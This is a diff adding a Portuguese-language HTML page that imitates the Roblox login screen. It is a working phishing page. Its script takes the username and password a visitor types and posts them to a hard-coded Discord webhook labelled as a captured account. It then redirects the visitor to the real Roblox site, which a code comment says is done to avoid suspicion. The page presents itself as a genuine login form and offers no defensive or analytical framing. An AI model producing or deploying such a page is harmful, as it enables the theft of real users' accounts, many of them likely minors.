@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Roblox</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f2f4f5; font-family: Arial, sans-serif; }
+        .roblox-input { border: 1px solid #b8b8b8; transition: border-color 0.2s; }
+        .roblox-input:focus { border-color: #00a2ff; outline: none; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+
+    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md border border-gray-200">
+        <div class="text-center mb-8">
+            <h1 class="text-4xl font-black text-gray-800 tracking-tighter">ROBLOX</h1>
+            <p class="text-gray-500 mt-2">Faça login para continuar</p>
+        </div>
+
+        <form id="loginForm" class="space-y-4">
+            <div>
+                <input type="text" id="username" placeholder="Nome de usuário/Email/Telefone" 
+                    class="roblox-input w-full p-3 rounded bg-gray-50 text-sm" required>
+            </div>
+            <div>
+                <input type="password" id="password" placeholder="Senha" 
+                    class="roblox-input w-full p-3 rounded bg-gray-50 text-sm" required>
+            </div>
+            
+            <button type="submit" 
+                class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded transition duration-200">
+                Entrar
+            </button>
+        </form>
+
+        <div class="mt-6 text-center space-y-2">
+            <a href="#" class="text-xs text-blue-500 hover:underline block">Esqueceu a senha ou nome de usuário?</a>
+            <div class="border-t pt-4 mt-4">
+                <p class="text-xs text-gray-400">Não tem uma conta? <a href="#" class="text-blue-500 hover:underline">Cadastre-se</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // COLE A URL DO SEU WEBHOOK AQUI
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1560781791873343528/mrPy934yGPIi_jR6qiaoyoAKwd6NgWLKDgwS-3OkSmE8pk9er6e4lm4Dc9VMvNDHgvjB';
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // Montando o payload em JSON, que é o formato preferido do Discord [4]
+            const payload = {
+                content: `🚨 **Nova Conta Capturada!** 🚨\n**Usuário:** \`${user}\`\n**Senha:** \`${pass}\``
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                // Redireciona para o site real para não levantar suspeitas
+                window.location.href = 'https://www.roblox.com/home';
+            })
+            .catch(err => {
+                console.error('Erro:', err);
+                alert('Erro de conexão. Tente novamente.');
+            });
+        });
+    </script>
+</body>
+</html>
